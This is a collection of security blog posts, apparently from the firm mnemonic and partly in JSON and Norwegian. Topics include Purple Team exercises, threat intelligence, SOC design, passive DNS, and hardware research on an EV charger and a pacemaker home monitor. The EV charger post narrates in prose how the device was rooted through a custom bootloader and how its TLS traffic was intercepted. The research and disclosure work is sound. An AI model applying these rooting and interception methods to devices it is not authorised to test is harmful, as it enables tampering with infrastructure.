this blog post, we describe our collaboration with SRA in further detail.The mnemonic Purple Team platform with Vectr as the backbone is how we now coordinate nearly everything related to Purple Team exercises. We provide both the Red Team and Blue Teams with access to the platform so they can collaborate in real-time, all the way through the planning, execution and reporting stages of a Purple Team exercise. We have prepared a range of attack simulations we can run to practice detecting and responding to common attack scenarios and attacks on specific platforms such as Active Directory, or we can run custom tests to trigger specific detection controls. In summary, the mnemonic Purple Team platform:A campaign dashboard displays ongoing Purple Team exercises, their progress and outcomes.Each campaign has a range of test cases, and we manage each case in fine detail. The Red and Blue Teams have access to everything, and all parties see the execution and reporting in real time. Test cases can be changed or adapted to address new test scenarios or constraints immediately, even during testing. The test case overview also provides a visual \"Escalation path\" diagram showing each test case in the Mitre Enterprise Tactics kill chain.Each test case in a campaign has a Red and Blue side, where the Red Team adds their test case execution details, and the Blue Team adds their results from detection and response, indicating whether they have Blocked, Alerted, Logged, or maybe not even seen the event at all.All reporting is available on the Purple Team platform itself. Our tests have shown that quantified defensive scoring leads to the most improvement. With the built-in reporting features in Vectr, it's easier than ever to get a clear overview of defensive success with clear metrics such as ,  and .A range of presentation options is available, from sector diagrams of coverage, test case drill-downs, indicators of compromise and, as shown below, a heat map showing the organisation's coverage of Mitre ATT&CK TTPs dynamically.Additionally, the platform can display historical data for repeated exercises, highlighting improvements to detection and response over time.What's most important here is that the results of the exercises are measurable. Reporting is clear and concise in various formats suitable for everything from executives to those developing detection signatures. We are confident this platform is the right way to deliver Purple Team services at scale.The first thing we do is host a meeting with the stakeholders and Blue Team members, and our or our customers' Threat Intelligence group to scope the exercise. Together, all are involved in scoping the test to target:A Purple Team exercise follows a design hierarchy like this, with an example figure below.Our Red Team uses the Purple Team platform to create a test plan draft, which is then further expanded upon with our Threat Intelligence department in a dedicated workshop. From here on, nearly everything happens on the platform. We establish the test as an assessment, with potentially multiple campaigns, where each campaign typically contains 15-30 test cases.We then get all the stakeholders and the Blue Team members enrolled into the platform, present the campaign(s) and agree on all practicalities. Typically, we make changes to the test plan until the end.We start the Execution phase with an execution kick-off meeting to land all the final details. Once the Red Team executes, the Purple Team platform is open on everybody's screen. The test case execution details start pouring in rapidly as the Red Team is testing, both automatically and manually. Each day of testing starts and ends with a short debriefing meeting so that everybody involved is aligned on the test progress.After testing is complete, a comprehensive Blue Team debrief is performed. Based on this, the Red Team develops a report based on the findings in the platform. The Red Team presents the report to stakeholders, with comments from the Blue Team and recommendations from the Red Team.The Blue Team follows up with implementing changes, which can involve improving existing detection and developing new detection capabilities. They sometimes even initiate more extensive strategic improvements with the help of stakeholders, such as updates to the defensive technologies, improvements to procedures or re-testing of specific controls. Once the Blue Team is satisfied with their improvements, we host a follow-up meeting between the Red Team, Blue Team and stakeholders. This meeting ensures the organisation identify potential improvements and plans future work, re-testing or additional testing.We love Vectr and want to acknowledge the great work done by its developers . We recently got involved in the  on Discord, and by contributing there and on GitHub with testing and reporting issues, we got in contact with SRA. We quickly realised we had much in common and could improve each other.SRA distributes Vectr as free software for educational and internal Purple Team use, which is fantastic. As our Purple Team offering is largely based on Vectr, we have an enterprise license agreement with SRA for consultancy usage. As mentioned earlier in this post, this allows SRA to grow the Vectr development team, develop new features and also gives us priority support and assistance. mnemonic offers a range of services, including threat intelligence. Our TI department was very eager when we put their carefully designed Threat Events™ (typical attack scenarios) into Vectr and realised we could automate and run Purple Team exercises from these scenarios. Together with SRA, we are finding ways to make Purple Team exercises even more available and show organisations how they can achieve defensive success with Vectr.What we love about Vectr is how it has enabled us to start delivering Purple Team exercises at scale, and our customers and the Blue Teams we work with immediately embrace it just as quickly as we have. Everything works better than before; planning, executing, reporting and follow-up are far more easily tracked, and it's much easier to see the actual improvements the organisations are making.Want to know more about this topic?

He will also discuss what should be done nationally to raise our digital basic security.NSR:The Norwegian Business and Industry Security Council (NSR) is a member organisation that serves the Norwegian business sector in an advisory capacity on matters relating to crime. NSR helps companies that need advice and counselling regarding industrial espionage, sabotage, narcotics, theft, terrorism, organised crime, fraud, extortion, corruption, computer criminality, and more.Has three years of National Cyber Security Strategy and up-to-date security legislations provided us with the national resilience we need to meet security challenges in 2022? This presentation wants to shed light on this issue by looking at the foundation and intention behind the new Security Act. Where do we stand today and how do we see national digital security mature? Organisations need to use a limited set of resources to deal with an increasingly complex security landscape of changing threats, regulatory requirements, and technological advances.Knowing that all your investments are pulling in the same direction requires an overview many organisations lack. To get this overview, you need a structured, holistic approach to digital security, where you establish a common foundation and a common language between the IT and business part of the business. This establishes a common understanding of how security investments can support business goals.This is an area we at mnemonic have been working on for a long time, both for ourselves and our customers.

Beslutningstakere med god trusselforståelse kan prioritere ressurser til konkrete og målrettede tiltak, tilpasset de truslene virksomheten står overfor.", "content": "En risikobasert tilnærming til sikkerhetsstyring er avhengig av god trusselforståelse. For de fleste virksomheter handler det om å forstå de konkrete taktikkene og teknikkene som kan utnytte sårbarheter for å ramme verdier. Denne kunnskapen gir et beslutningsgrunnlag for å prioritere sikkerhetstiltak tilpasset de faktiske truslene organisasjonen står overfor. Sikkerhetstiltak forankret i trusselforståelse bidrar til bedre ressursprioritering i det forebyggende sikkerhetsarbeidet. En trusselvurdering er et godt sted å starte. Rapporten favner bredt og beskriver utfordringer, trender og målsetninger for forsvarlig sikkerhet mot 2030. Sammen med Forsvarskommisjonen, Riksrevisjonens arbeid med digital sikkerhet i sivil sektor og Totalberedskapskommisjonen er rådet et viktig bidrag til offentlig debatt og politikkutforming i en sikkerhetspolitisk og sikkerhetsfaglig krevende tid. Dette innlegget handler om et enkelt, men grunnleggende, poeng i rapporten: trusselforståelse er grunnsteinen for virksomhetenes arbeid med risiko- og sikkerhetsstyring.NSMs Sikkerhetsfaglig råd, 2023Forståelse for trusselbildet er en forutsetning for å gjøre veloverveide sikkerhetstiltak basert på risiko. God trusseletterretning () er en viktig inngangsverdi til risikovurderinger og hvordan virksomheten jobber med sikkerhet. Vi må forstå trusselbildet for å ta informerte valg om beskyttelsestiltak. Trusseletterretning må være en integrert del av risiko- og sikkerhetsstyringen i virksomhetene.Vi må forstå den strategiske og sikkerhetspolitiske konteksten vi befinner oss i. Myndighetenes informasjon om utsatte sektorer og trusselaktørenes målsetninger er et startpunkt. Men det er ikke nok. De åpne sikkerhets- og trusselvurderingene fra myndighetene setter en viktig strategisk ramme, men kan ikke nødvendigvis omsettes av virksomheter til konkrete tiltak. Det underliggende informasjons- og datagrunnlaget er gjerne gradert og har et legitimt skjermingsbehov. Det er heller ikke slik at større innsikt i graderte data ville vært en fullgod løsning. EOS-tjenestene (etterretnings-, overvåkings- og sikkerhetstjeneste) sine mandater og oppdragsløsning overlapper i begrenset grad med informasjonsbehovet til de fleste private- og offentlige virksomheter. Situasjonsforståelse i seg selv gir ikke beskyttelse, men det gir et informert grunnlag for handling. Vi må ha kunnskap om de konkrete taktikker og teknikker en angriper kan benytte mot oss for å kunne velge de mest hensiktsmessige mottiltakene. Vi trenger et faktabasert informasjonsgrunnlag for å vurdere hvilke trusler som kan utnytte våre sårbarheter for å ramme våre verdier.For mange virksomheter er det ikke hensiktsmessig å fokusere på attribusjon, altså hvem som står bak et angrep eller utgjør en trussel. Trusselbildet er hele tiden i utvikling og attribusjon er teknisk krevende. Dessuten benyttes taktikker og teknikker på tvers av ulike aktører og aktørkategorier, som statlige etterretningstjenester og profesjonelle kriminelle grupper.Attribusjon kan selvsagt være svært viktig for myndighetene. Eksempelvis vil det ved tap av konfidensialiteten til militære planer eller politiske beslutningsprosesser være relevant hvem som har fått tak i materialet. Ved sabotasje og destruktive cyberoperasjoner vil troverdig attribusjon kunne være avgjørende for en alliert respons. For de fleste norske virksomheter er imidlertid ikke attribusjon nødvendig for å vurdere hva som er relevante sikkerhetstiltak for å oppdage, forhindre og reagere på uønsket aktivitet. De har større behov for konkret og detaljert informasjon om selve virkemidlene en angriper kan benytte for å ramme dem. Attribusjon kan være verdifullt i etterforskningen av alvorlige hendelser, men det krever gjerne involvering fra .Kunnskap om trusler er en hjørnestein i et proaktivt og kontinuerlig arbeid med sikkerhetsstyring. Dette fordrer robuste organisasjoner som er i stand til å jobbe kryssfunksjonelt med risiko, trusseletterretning og tekniske løsninger. Én tilnærming er å beskrive scenarioer, uttrykt som konkrete hendelser, som virksomheten kan bli utsatt for. Scenarioene gir et informert grunnlag for å utarbeide beskyttelsestiltak og sikkerhetsløsninger. Slik kan en risikobasert og helhetlig tilnærming til sikkerhet bygges lag på lag.For å tydeliggjøre forholdet mellom trusler, sårbarheter og verdier kan vi se på risiko visualisert i et sløyfediagram. Diagrammet er et alternativ til den tradisjonelle risikotrekanten som viser sammenhengen mellom trusler, sårbarheter og verdier. Sløyfediagram brukes blant annet av  for å visualisere risiko (NS 5814:2021). Modellen viser hvordan kunnskap om trusler er gjennomgående viktig i arbeidet med risiko. Spesielt når det kommer til deteksjon, valg av sikkerhetstiltak og hendelseshåndtering.Toppledelsen har ansvar for å definere organisasjonens risikotoleranse. Hvilken risiko virksomheten står overfor er derfor et viktig informasjonsbehov. For at sikkerhetsorganisasjonen skal kunne svare ut behovet er det viktig at de konkretiserer og forvalter informasjonsbehov om trusselbildet gjennom en strukturert prosess (). Trusselforståelse er en viktig inngangsverdi til risikovurderingen, og risikovurderingen gir et grunnlag for å utarbeide nye informasjonsbehov om trusler.Ledelsesforankring sikrer at arbeidet med trusseletterretning er knyttet til virksomhetens langsiktige sikkerhetsarbeid og er forankret i virksomhetens sikkerhetsmål. Å forvalte informasjonsbehov blir en del av risiko- og sikkerhetsstyringen.Den endrete sikkerhetspolitiske situasjonen, forandringer i trusselbildet og den raske teknologiske utviklingen krever kontinuerlig arbeid med sikkerhet. Derfor må myndigheter og private aktører jobbe sammen, og samtidig ha god rolleforståelse.Offentlige myndigheter bidrar med forklaringer på den overordnede sikkerhetspolitiske utviklingen og det strategiske trusselbildet. Myndighetenes utforming og oppfølging av lover og forskrifter er helt sentralt for at vi som samfunn skal lykkes med å ha den nødvendige sikkerheten på tvers av sektorer, og forsvare vår konkurransedyktighet internasjonalt. Departementenes arbeid med å kartlegge grunnleggende nasjonale funksjoner i tråd med sikkerhetsloven og forslaget til  er viktige prosesser. Det krever et helhetlig og risikobasert styringssystem for sikkerhet og tiltak som er tilpasset den faktiske trusselen. Kunnskap om trusselaktørenes taktikker og teknikker er avgjørende for å kunne gjøre veloverveide, tilpassede og konkrete sikkerhetstiltak.“Weakness in an information system, system security procedures, internal controls, or implementation that could be exploited or triggered by a threat source” ().Forholdet mellom trusler og sårbarheter er komplekst og sjelden en-til-en. En sårbarhet kan potensielt utnyttes av flere trusler, og en trussel kan potensielt utnytte flere sårbarheter.

{"title": "Reverse engineering an EV charger", "ingress": "We decided to look into one of the most prevalent chargers on Norwegian roads", "content": "This blog post walks through our efforts reverse engineering the Zaptec Pro charger, an electric vehicle charger found in many parking lots and apartment buildings around Norway.The post shows how we went about testing the device, including some of our trials and errors during the process. By analyzing the device’s firmware, and compiling a custom bootloader, we were able to root the device and dig into how it works.Although we found that security appears to have been considered at multiple steps along the way in developing the Zaptec Pro charger, the blog post also presents some potential improvement areas.Electric vehicles have become quite common over the past few years. Here in Norway, they make up over half of all new car sales. The chargers that support EVs have effectively become critical infrastructure that we rely on for everyday life. At the same time, the publicly available information about how they work is limited.Out of curiosity we decided to purchase the Zaptec Pro. This model was intended for larger, networked installations like parking lots and apartment buildings. The Zaptec Pro was among the most prevalent chargers on Norwegian roads at the time this post was written.The charger is a surprisingly powerful device. It runs a full-fledged Debian-based operating system with Wi-Fi, 4G LTE, Bluetooth, and power-line (PLC) network connectivity. It wouldn’t be too far off to think of it as a Raspberry Pi on steroids, with some 230V relays.As an end user, Zaptec is probably just the logo you see on the black box you plug your car into. Behind the scenes however, Zaptec has a whole cloud ecosystem designed to switch those relays on and off, as well as bill you for electricity consumption.To use a public charger a customer will normally have to download an app. These tend to be released by parking garage companies and charging network operators. A customer will enter their payment details in the app, and select a charger to use. At this point the app will make a request up to the cloud, and an integration between the app’s backend and Zaptec is used to start a new charging session.Zaptec uses Azure IoT Hub to communicate with and control their devices. More on how this works is discussed below.The charger has two PCBs, stacked on top of one another and linked via a 40-pin connector. The bottom PCB contains most of the power related components, while the upper PCB houses the “smart” components. Taking a deeper look at the upper PCB, there are a few different components of interest:We had previously learned that the device was running Linux by connecting it to a Wi-Fi network and running a port scan. It had a SSH listener on port 22.Basic brute-force password attacks didn’t work, so it was time to start looking around for debug interfaces on the PCB. The board had a fairly clean layout, and components were grouped into a few different sections. The most likely chip on the board to run Linux was the ARM processor. It was also next to flash storage and RAM chips, which seemed logical enough.Since it was an ARM processor, we were hoping to see JTAG/SWD interfaces, and/or UART serial ports. The JTAG/SWD ports, if left enabled, should theoretically allow us to dump firmware and modify running code. The processor physically has all these pins, and can be found by looking at the datasheet. However, soldering to an in-circuit BGA was out of the question. So, we’re more or less at the mercy of what the designer’s exposed on the PCB. Though it’s not hard to notice an unpopulated 3-pin header to the left of the NAND flash.The header had three pins, one being ground, so it was probably:We soldered a header on and hooked up logic analyzer to the pins, and discovered a UART serial interface.The console log provided useful information about the device, but unfortunately didn’t give us a shell. The bootloader had also been locked down and didn’t allow for interrupting the boot process, which prevented us from playing around in the U-Boot environment.It was at this point we realized that little silver rectangle below the ARM processor was just about the right size to be a microSD card slot.We put a SD card in the slot then reboot the charger. It didn’t boot. Either we made a brick, or the charger was trying to use the SD card as a boot device and we had nothing for it to boot. Removing the SD card and booting again validated our suspicions.We tried flashing the SD card with various images for development boards based on the same processor, with varying success. A few images managed to start but inevitably would hang in U-Boot before loading the Linux kernel.This issue was ultimately down to the fact that there were hardware differences between the development board and the Zaptec PCB. This resulted in the images being incompatible. Zaptec likely used different ram, or connected the various components to different pins.The way U-Boot and Linux know about the hardware configuration for a device is through a devicetree. This is essentially a file that describes hardware like RAM and flash storage, so that the OS knows how to interact with them. Normally, a designer will sit with board schematics to create a devicetree. Since we didn’t have access to Zaptec’s schematics we were left with finding another solution.Access to a device’s firmware is always nice to have. Not only would it provide further information about how the device worked, but if we got access to the Zaptec devicetree, it could allow us to compile our own compatible bootloader or OS.It wasn’t the cleanest job in the world, but we were able to successfully desolder the TSOP48 NAND chip and dump its contents using a TL866II Plus programmer.The binary file produced by the programmer is an exact byte-for-byte copy of the NAND flash. This presents some challenges, as the partitions we want to analyze are mixed in with other data such as error correction bits and space reserved for wear leveling. This is known as out-of-band (OOB) data and is introduced by the NAND controller integrated into the ARM processor.Damien Cauquil held  in 2019 that went into detail about how this process works on I.MX based processors. Lucky for us, he released . It produces a binary file similar to what U-Boot or Linux would see when interacting with the NAND flash.After poking around in the firmware for a while, we were able to carve out Zaptec’s devicetree binary from the boot partition.We considered building Linux to boot from the SD card, but eventually decided to just compile U-Boot. If we resoldered the NAND flash, and had the ability to enter a U-Boot environment, we could control the boot arguments passed to the Linux kernel. This would allow us to enter single user mode, which essentially just drops you into a root shell without prompting for a password.We included the devicetree binary as part of the U-Boot build process, and flashed the bootloader to an SD card. Once in our custom U-Boot environment we set some environment variables that told U-Boot to boot from the NAND flash and enter single user mode.Once in single user mode we set a new root password, and rebooted without the SD card. Now we could connect with SSH over WiFi using our new root password!Now with root access to a running device, we wanted to investigate a few different aspects of how the charger worked.The device comes set from the factory with a four-digit PIN code. It’s printed on the box and can’t be changed. It is used to manage a few settings, like how the charger connects to the internet.Two questions we wanted to answer were:From what we can tell it looks like the PIN code is set from a server in the factory when the device is initially programmed. Looking through the very first logs that appear on the device hints at this.Since the PIN code (and Azure access token) is provisioned from a server in the factory, we’re not getting access to the code that generates these secrets anytime soon. Ideally the PIN should be a truly random number, and not based on an identifier or some wonky cryptography.That still begs the question of what can you actually do if you know a PIN code. Before purchasing the charger, we decompiled the Android application and poked around at the Bluetooth Low Energy (BLE) functionality. In the Android application’s list of BLE characteristics the “RunCommand” was certainly interesting.Digging a bit further in the Android application’s code revealed commands to start and stop charging via Bluetooth. Assuming you had the PIN code, maybe you could get free charging by issuing these commands over Bluetooth?Now with access to the charger’s code we could see what it actually does. The BLE interface was written in Python, which made things easy to look through.So essentially what happens here is the value of whatever you send to the BLE characteristic gets passed to the smart_service.RunCommand() function. The smart service is another process running on the charger written in .NET mono. Python communicates the smart service through a D-Bus messaging interface. Let’s go see what the RunCommand function can do.The .NET code only seems to implement the Reboot and UpdateFirmware commands. The StartCharging and StopChargingFinal commands look to be functions that were partially implemented in the Android application, but never implemented on the charger. No free charging via Bluetooth.So apart from reconfiguring the device, and potentially causing it to disconnect from the network and stop working, what you can do via the Bluetooth interface seems to limited.It is worth noting that due to the nature of BLE, it would be possible to sniff the PIN code when the device is configured by a technician, but this would require somebody to be listening at that exact moment in time. Zaptec also implemented PIN brute force protection in the Python code. If you enter an incorrect PIN code too many times the Bluetooth interface switches off. The amount of time the Bluetooth interface remains off increases with each incorrect PIN attempt. So, you could brute force the PIN but it would take a long time. And at face value access to the BLE interface for an attacker doesn’t seem to be terribly interesting.One of the first things we wanted to do after connecting the device to a network was figure out if there was a hardcoded root password. There wasn’t.Zaptec placed two public SSH keys on the charger, but the shadow file was empty until we configured a password ourselves in single user mode. This configuration allows Zaptec to login via SSH with the correct key pair, but effectively disables password authentication for both the SSH listener and the UART console.The final area we wanted to investigate was the cloud connectivity. We took a few packet captures early on and knew that the charger was talking to the Azure IoT Hub, but couldn’t see what it was sending because the traffic was encrypted.With root access we were able to install our own root certificate and perform TLS decryption by proxying traffic through mitmproxy.Analyzing a decrypted PCAP allowed us to verify that the charger was communicating with the Azure IoT Hub using Shared Access Signatures, an authentication mechanism that derives credentials based on a secret that was provisioned at the factory.Looking at a few messages published to the IoT Hub revealed the types of data it sends back to Zaptec. A quick look revealed a few things like Linux kernel logs and electricity consumption data. We also took at a look at the .NET code to see everything it was capable of doing via the IoT Hub. We weren’t able to easily test if this functionality worked, but we did find what appears to be Zaptec’s means of remotely debugging their devices.The first is a function called RunRemoteCommand. This passes the contents of a message received from the cloud directly to Process.Start.A second interesting function called StartRemoteTunnel appears to allow Zaptec to create a reverse shell back to an SSH listener on the internet.All in all, we didn’t find any critical security issues during our investigation. Though there is probably room for improvement in a few areas. For example, we would have had a much harder time getting root access to the device if they had used signed firmware, or encrypted the NAND flash. Both of these features are supported by the ARM processor already built into the charger.Security appears to have been considered at multiple steps along the way, and was better than we expected going into the project.", "url": "https://www.mnemonic.io/resources/blog/reverse-engineering-an-ev-charger/", "category": "resources", "subcategory": "blog"},

{"title": "How to build a reactive security function", "ingress": "A high level approach", "content": "As with most aspects of cyber security, building a reactive security function has no correct answer. As the cyber landscape develops, the silver bullet product and other definite answers seem to be further and further away from being achievable. Being in a position where you are tasked to protect an organisation from something defined as “the cyber security threat” can be very daunting. If one tries to google “protection against cyber security threats” or “mitigating cyber risk,” you may just end up with more questions than answers.This blog post is written mainly for individuals looking to build a function that will respond to security threats within an organisation. I could have called the function a SOC, CSIRT, CSOC, cyber defence centre etc., but in lack of a good term that defines the whole umbrella, I’ll refer to it as . I also hope the train of thought presented here will help those with existing functions to identify areas of improvement. Especially in terms of tying your capabilities together!There are few blueprints that explain exactly how organisations should organise themselves in order to respond to potential security threats out there. The good old IDS based central SOC has seen its heyday, and we now see a shift towards more distributed approaches as a result of DevOps and cloud workloads. Early adopters saw this early in  and  where you see more of a “you build it, you secure it” approach. Both for prevention and detection.Understanding what operating model suits your organisation is difficult enough, but understanding what steps to take, at what time and how fast you need to get there on a strategic and tactical level is equally difficult. If you are looking to start from scratch, or if you already have a function in place, it’s important that you realise what steps should be taken to ensure success.How many times have we seen larger initiatives to build a SOC or another reactive security function be driven by technology or specific capabilities? For instance starting off acquiring a SIEM tool or SOC/MDR provider without understanding that particular capability's role in a larger picture. This leads to a non-cohesive approach, which more often than not leads to a lack of understanding of whether the efforts made are the right ones at the right time, and if they support the business objectives at all.In the figure below, I want to show how a journey to build a reactive function could look like. I also want to show how an approach driven by a particular technology or capability could leave you with more questions than answers. The goal should be to understand why you are implementing the particular capability at that particular time.To illustrate how to implement a larger capability its necessary to include several steps and multiple dimensions - strategic as well as operational. I’ve tried to visualise a structured approach to building a larger capability which entails the “journey” one takes when starting from scratch.This approach attempts to build a function that provides answers to why certain tasks are being performed, and at what time. Taking you all the way from business goals down to particular operational tasks. Having this common foundation stemming from the business’ goals will make it easier to prioritise which tasks pushes towards these goals, and which do not. The approach forces you to reflect over what is important to the business and what specific capabilities you could implement to enable the business. The process also covers steps for defining a strategy where you will have to make it clear how far you want to go, when you will get there and how you intend to take that journey.While writing this post, I reflected around common denominators for the projects that implement a reactive security function successfully. That commonality is depressingly, pain. Incidents are usually what triggers investments into cyber security. Such occurrences will very often require acquisition of capabilities in hurry, leaving you without the luxury of planning all your steps ahead. This comes at the expense of not being at the appropriate maturity level when making these investments. For instance not having stand up basic monitoring with some response capabilities and without having made plans of how to support these functions over time. Realistically, I believe most organisations can relate to this.If you find yourself reading this, realising you skipped most of the “non-technical” steps, I think there will be value in backtracking and performing the strategic steps to better understand if the steps you already took made sense and how to set yourself up to take the next.Lastly… Be concrete! A flashy strategy is seldom worth its time and effort unless it shows how you intend to operationalise your goals into capabilities that will yield value. So let’s get specific!Having a clear understanding of dependencies and synergies is imperative when designing your function. There will be tools out there that will help you define requirements, for example in guidelines provided by NIST, ISO, SIM3, FIRST and many more. These organisations provide maturity assessments and lists of typical capabilities you would need, which can be used as inspiration to fill your project plan. From there, defining an operational model will help you understand how these capabilities and technologies will be interconnected. As such, it can also be used to identify missing capabilities in terms of personnel, competency or other dependencies such as governance, risk and compliance elements that will play a larger role for how you understand the landscape you are meant to protect.This situational awareness plays an important role when building your function. Having a strong GRC backbone with insights into values, risks, assets and your threat landscape is essential to be able to contextualise and rationalise the ” when making priorities, choices and decisions.To exemplify, I’ve visualised an operating model I was presented awhile back which has four interconnected pillars:These four pillars will be connected in many shapes and forms, each with their own set of capabilities. By visualising these intertwined connections and branches we quickly get a visualisation of your capability needs. However, what it does not show is how much we need of each capability, when we need it and how we will get it. This is where understanding your own business and the threat landscape you reside in comes in together with investment opportunity - aka your situational awareness!Dependencies, dependencies, dependencies…You’ve read the guidelines and used the frameworks. You now have a great plan. As well as management support. You designed how your function is going to look like. All is good!But is your plan set up with necessary means to succeed? Realising where a reactive security function resides in the overall security ecosystem is important. And order is key!We want to put ourselves in a position to detect when the bad guys come knocking on our door, but also to kick them to the curb when need be. However, to get there requires an understanding of which steps need to be taken prior to others. I.e building a lot of reactive mechanisms such as detection will be a frustrating effort if there are no resources or preventative mechanisms that are put in place to reduce noise over time.Let me draw a parallel to policing. We use police to enforce laws and regulations in a community that desires to live peacefully together. Philosophically, you could say that police are there to ensure that our way of life is not threatened. Efficient policing of a community does not start and end with cars patrolling around, where the quality of the policing is defined by who sits in the police car or what type of police car is used. It will be defined by multiple aspect such as, funding, access to resources, structure, training, legislative support, etc. Your reactive security function will have similar dependencies.To explore these dependencies, I’d like to show how Forrester depicts their “targeted attack hierarchy of needs.”As you can see, the reactive aspect of cyber security is placed at the very top of the pyramid. This means it’s going to be hard to know how much detection and response you want to build (or acquire) without a form of foundational strategy guiding your direction.Detection and response efforts will be drowned in a sea of alarms if one fails to implement protective mechanisms prior to reactive mechanisms. If your organisation has no one that focuses on the “fundamentals”, performing tasks such as patch management, resources to administer proxies, firewall and identities, it’s going to be a tall order to build a reactive product that will eliminate the risks tied to preventative capabilities. And in many cases, if there are no preventative mechanisms in place, you cannot do detection.Lastly, I want to emphasise the importance of building a function that allows for automation and orchestration. It’s a necessity to keep up with the amount of information thrown at what we today call “security analysts” but tomorrow will refer to as “security engineers”If the prerequisites of detection and response are not met, it’s not likely that you will be able to efficiently provide the capabilities you see relevant for the business based on the journey depicted in Figure 1 or the operational model you have designed.We're not finished with the dependencies...In the very end, after going through all the different steps above, our goal is to be in a position where we can counteract adversaries. We want to be certain that we have the necessary competency and man/womanpower to combat threats that your organisation might face.Matt Swann at Microsoft has depicted his own  which I think fits well together with Forrester’s triangle. Where Forrester focuses more on security as a whole, Matt Swann shows the needs of the reactive function in more detail.There will be multiple capabilities, technologies, and competencies tied to these different needs at different levels. These need to be defined in your operation model, and this triangle insinuates the order of implementation.Building a reactive function, no matter if you called it a SOC, CSIRT, CSOC, cyber defence centre etc., will never be about silver bullets or definite answers. Hopefully this blog post has provided some “food for thought” and inspiration to help identify areas of improvement to your function – both if you are looking to start from scratch, or if you already have a function in place.", "url": "https://www.mnemonic.io/resources/blog/how-to-build-a-reactive-security-function/", "category": "resources", "subcategory": "blog"},

{"title": "Uncovering vulnerabilities in pacemakers", "ingress": "Results from five years of The Pacemaker Hacking Project.", "content": "Back in 2015 I started The Pacemaker Hacking Project as a little hobby in my spare time. I had been living with a pacemaker implanted in my chest for four years and all this time I had a nagging thought in the back of my mind. Could the Internet connectivity of my implant open up an attack surface for hackers? After five years, I am happy to report that a milestone has been reached. A part of my team’s research, which was previously under embargo due to a coordinated vulnerability disclosure process, has finally been published in an official  with the following CVEs:It is estimated that there may be up to one million pacemakers implanted globally every year, and it represents a $5 Billion USD industry. There are quite a few manufacturers, and the technology continues to evolve to improve battery life, implant size, the ability to not be impacted by things like MRI scans, and remote monitoring and configuration capabilities.My pacemaker is connected wirelessly through a device called the Home Monitoring Unit (HMU). It comes in different variants that can look a bit like an old-fashioned mobile phone, a home router, or in the case of the most recent model, a smart phone.The HMU enables data from the pacemaker to be remotely sent to doctors and hospitals. Without this capability, heart rhythm data, diagnostics and configurations would need to be read manually, requiring frequent visits to a hospital or clinic. With remote monitoring, things like abnormal heart rhythms and even issues with the pacemaker itself can be discovered faster, and without the frequent hospital visits. This also helps improve peace of mind when having a piece of technology implanted in your body, knowing that it is functioning correctly at all times.But with connectivity comes vulnerability, and as a security researcher I was very curious about the security of the device itself, and the wireless communication protocols that transmitted my patient data.Since the manufacturer of the device was not transparent about their cybersecurity practices, and the communication protocols were all proprietary and not based on any open standards, I decided that the only way to figure this out was to start a hacking project.I purchased used home monitoring units on eBay and assembled a small team of volunteers. After being accepted to speak at some high profiled conferences the project gained attention and I secured a small amount of funding from my employer at the time, the independent research institute SINTEF, to also work on it as part of my day job.It took some time to get the project rolling due to all of my other work engagements, including a 20% position at the Norwegian University of Science and Technology (NTNU) where I teach students about incident response, forensics and ethical hacking. In order to get more activity in the project I offered to be a supervisor for students to work on The Pacemaker Hacking Project as part of their thesis in fulfillment of their Master’s degree. So far six students collaborating in pairs of two have completed their Master theses, and their work has greatly contributed to the results of the project:Our research showed that the credentials the HMU uses for logging on to the backend infrastructure are sent in cleartext. Also, the HMU does not perform mutual authentication, which means that it is possible to connect to it using a fake cellular base station and perform a Man-in-the-Middle attack. The HMU switches to an encrypted channel before sending patient data, but the encryption keys are stored in recoverable format. This means that an attacker with physical access to the HMU can get access to the credentials and use these for network authentication and decryption of data in transit.Since I did not want to put patients at risk by publishing our research the findings were shared with the manufacturer BIOTRONIK in a coordinated . The disclosure process involved several parties, including the German national cyber security authority (BSI) and the Industrial Control Systems Cyber Emergency Response Team (ICS-CERT) in the US as coordinators. The regulatory bodies Federal Institute for Drugs and Medical Devices in Germany (BfArM) and the U.S. Food and Drug Administration (FDA) were also included in the information sharing. After numerous conference calls and a process lasting over a year our research has resulted in the  with the following CVEs:A technical walk through of the findings can be found on .These research findings were shared with BIOTRONIK in the form of a vulnerability report. BIOTRONIK cooperated according to a Coordinated Vulnerability Disclosure process and appropriately analysed and validated our report. They then shared their responses to each reported vulnerability, and we discussed each point in detail. During these discussions, BIOTRONIK provided sufficient information to confirm that patient harm arising from the vulnerabilities is very unlikely. BIOTRONIK recommends that healthcare providers and patients continue to use the investigated devices as intended and follow device labelling.BIOTRONIK has also released a  about our findings where they stress that even though it is possible to exploit these vulnerabilities to launch a Man-in-the-middle attack on the HMU, their design makes it impossible to transmit commands to the implants remotely, which obviates the potential of reprogramming the patient's device and doing direct harm to the patient.This means that after five years I can finally rest assured that my pacemaker implant is not at immediate risk from hackers. However, as a cryptographer I am not very happy about seeing that my patient data is encrypted with recoverable keys, and that DES is still being used as an algorithm in the proprietary communication protocols. I am however very pleased that BIOTRONIK is taking our vulnerability reports seriously, and that they value our contributions to help securing patients from harm.", "url": "https://www.mnemonic.io/resources/blog/uncovering-vulnerabilities-in-pacemakers/", "category": "resources", "subcategory": "blog"},

The Innovation Project is to lead to renewal and sustainable value creation for the project’s business partners, and funding should also generate socioeconomic benefits by making new knowledge and solutions available.The main goal of the research project is to semi-automate the digital risk management process, in order to find new methods for analysis of relevant and available security data. The project also aims to improve the understanding of risk among decision-makers by finding new methods for presenting risk information.Siri Bromander, Head of R&D in mnemonic, states that she is excited to see the broad effects the project can have.- We expect that the results from this project will have effects on how we do risk assessment in a more realistic manner and how we prioritise security measures.- Risk management and the calculation of risk is now mainly performed by individuals, and is largely based on prose and situational awareness more than data from security systems and threat intelligence relevant to the individual organisation.

Many in the community are familiar with the projects we either run or support, but this time it’s all about giving back to the user.Our new DNS cloud service extends our Threat Intelligence database with vast amounts of legitimate and malicious DNS traffic from users all around the world. By passively collecting DNS data from domain name lookups, we can compare similar entries over time to detect discrepancies.For example, if BBC.com suddenly starts resolving to a different IP address, a security researcher will be able to go back and pinpoint the exact point in time the legitimate website served malicious code using our passive DNS data. By doing this, users of our free passive DNS database can be protected against visiting fluctuating or previously unknown domains, which are often associated with malicious behavior.In addition, our DNS service includes block lists of known bad domains and IP addresses. If a user is unlucky enough to request a malicious domain, our DNS server redirects them to our sinkhole, and prevents the user from visiting the malicious domain in question. When this happens, our sinkhole presents an informative block page to the end user, giving them the necessary info to contact us in case a legitimate and otherwise safe domain has been blocked.Companies and smaller organizations can easily redirect their users to our public DNS servers to add an additional layer of security outside their own perimeter. Our secure DNS service includes block lists from our Argus Managed Defence service, and are checked by analysts in our Security Operations Center (SOC) for 